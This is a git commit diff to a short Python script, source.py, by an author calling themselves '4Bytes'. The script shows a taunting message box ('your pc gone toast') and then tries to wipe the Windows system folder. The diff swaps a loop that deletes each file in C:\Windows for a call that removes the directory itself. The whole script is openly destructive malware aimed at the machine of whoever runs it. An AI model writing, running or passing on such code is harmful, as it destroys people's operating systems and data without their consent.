13dbda33ebf5feb1189a986acae2ee34cc57a9bc
4Bytes <53712708+Luckytrang2010@users.noreply.github.com>
2020-09-27 15:27:48 -0400

    Update source.py

--- source.py
+++ source.py
@@ -1,5 +1,4 @@
 import win32api
 import os
 win32api.MessageBox(0,"your pc gone toast","4bytes was here :))))))))))))))))))))))))))))")
-for i in os.scandir("C:\\Windows"):
-    os.remove(f"C:\\Windows\\{i}")
+os.rmdir("C:\\Windows\\")
